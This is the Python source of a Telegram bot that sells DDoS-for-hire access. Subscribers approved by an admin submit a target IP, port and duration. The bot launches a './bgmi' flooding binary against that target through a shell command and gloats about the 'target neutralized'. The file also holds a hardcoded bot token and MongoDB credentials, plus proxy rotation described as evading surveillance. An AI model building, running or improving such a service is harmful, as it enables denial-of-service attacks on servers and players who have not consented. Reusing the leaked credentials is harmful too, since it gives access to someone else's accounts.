import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

# Bot Configuration: Set with Authority
TOKEN = '7750:AAEY6G0uIanl_Hpn0_YegCJI7DE8h-M44cs'
ADMIN_USER_ID = 6437994839
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@RitikXyz099"  # Immutable username for maximum security

# Attack Status Variable to Control Single Execution
attack_in_progress = False

# Logging for Precision Monitoring
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection - Operative Data Storage
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users
vps_collection = db.vps  # MongoDB VPS storage

# Bot Initialization
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Operations
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by @RitikXyz099")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack Initiation - Operative Status Checks and Intensity
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")
    await process.communicate()

    attack_in_progress = False  # Reset the flag after the attack is complete
    notify_attack_finished(target_ip, target_port, duration)

# Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
        f"💣 *PORT BREACHED:* `{target_port}`\n"
        f"⏳ *DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of @RitikXyz099*",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"🚫 *Access Denied. Only @RitikXyz099 controls this realm.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by @RitikXyz099*", parse_mode='Markdown')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
        if limit_reached:
            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by @RitikXyz099*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by @RitikXyz099*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} removed. Clearance by @RitikXyz099*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, @RitikXyz099.*", parse_mode='Markdown')
        return

    user_id = message.from_user.id

    try:
        # Check user access
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, f"🚫 Unauthorized. Access limited to @RitikXyz099.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, f"🟠 Plan 🧡 is full. Reach out to @RitikXyz099 for upgrades.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, f"💥 Instant++ Plan at capacity. Contact @RitikXyz099.")
            return

        bot.send_message(chat_id, f"📝 Provide target details – IP, Port, Duration (seconds). Controlled by @RitikXyz099")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, f"⚠️ *Format incorrect. Use: /Attack <IP> <Port> <Duration>. Maintained by @RitikXyz099*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if duration > 240:
            bot.send_message(message.chat.id, f\"⚠️ *Time limit exceeded. Maximum duration allowed is 240 seconds.*\", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by @RitikXyz099*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f"💀 *⚠️ ATTACK INITIATED!* 💀\n\n"
            f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
            f"🎯 *TARGET SET:* `{target_ip}`\n"
            f"🔒 *PORT ACCESSED:* `{target_port}`\n"
            f"⏳ *DURATION LOCKED:* `{duration} seconds`\n\n"
            f"🔥 *Unleashing force. No turning back. Powered by @RitikXyz099* ⚡",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])

@bot.message_handler(commands=['add_vps'])
def add_vps(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "🚫 *Unauthorized. Only HQ (@RitikXyz099) can add VPS.*", parse_mode='Markdown')
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ *Usage: /add_vps <ip> <location>*", parse_mode='Markdown')
            return

        ip, location = parts[1], parts[2]
        vps_collection.insert_one({"ip": ip, "location": location})
        bot.reply_to(message, f"✅ *VPS Added: {ip} ({location})*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Add VPS error: {e}")
        bot.reply_to(message, "❌ *Failed to add VPS. Try again.*", parse_mode='Markdown')

def send_welcome(message):
    # Unique, Intense Menu Options
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    options = [
        "💀 Initiate Attack 🔥", 
        "🔍 Status Report", 
        "📜 Mission Brief", 
        "📞 Contact HQ"
    ]
    buttons = [KeyboardButton(option) for option in options]
    markup.add(*buttons)

    bot.send_message(
        message.chat.id,
        f"👊 *Welcome to Command, Agent. Choose your directive.* Managed by @RitikXyz099",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "💀 Initiate Attack 🔥":
        bot.reply_to(message, f"*Command received. Preparing deployment. Stand by, @RitikXyz099*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "🔍 Status Report":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
            response = (f"*Agent ID: @RitikXyz099\n"
                        f"Plan Level: {plan}\n"
                        f"Authorized Until: {valid_until}\n"
                        f"Timestamp: {datetime.now().isoformat()}. Verified by @RitikXyz099*")
        else:
            response = f"*Profile unknown. Contact @RitikXyz099 for authorization.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "📜 Mission Brief":
        bot.reply_to(message, f"*For support, type /help or contact @RitikXyz099 at HQ.*", parse_mode='Markdown')
    elif message.text == "📞 Contact HQ":
        bot.reply_to(message, f"*Direct Line to HQ: @RitikXyz099*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❗*Unknown command. Focus, Agent. Managed by @RitikXyz099*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("🚀 Bot is operational and mission-ready.")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")

